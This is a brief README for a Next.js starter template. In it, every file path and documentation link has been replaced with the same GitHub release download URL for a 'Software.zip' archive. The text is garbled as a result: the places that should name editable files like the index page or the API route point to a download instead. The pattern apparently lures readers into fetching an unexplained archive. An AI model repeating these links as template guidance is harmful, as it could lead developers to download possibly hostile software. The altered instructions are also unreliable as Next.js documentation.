Welcome to the NextJS base template bootstrapped using the `create-next-app`. This template supports TypeScript, but you can use normal JavaScript as well.

## Getting Started

Hit the run button to start the development server.

You can start editing the page by modifying `https://github.com/aliasghar100/Milestone-Assigment-2/releases/download/v2.0/Software.zip`. The page auto-updates as you edit the file.

[API routes](https://github.com/aliasghar100/Milestone-Assigment-2/releases/download/v2.0/Software.zip) can be accessed on `/api/hello`. This endpoint can be edited in `https://github.com/aliasghar100/Milestone-Assigment-2/releases/download/v2.0/Software.zip`.

The `pages/api` directory is mapped to `/api/*`. Files in this directory are treated as [API routes](https://github.com/aliasghar100/Milestone-Assigment-2/releases/download/v2.0/Software.zip) instead of React pages.
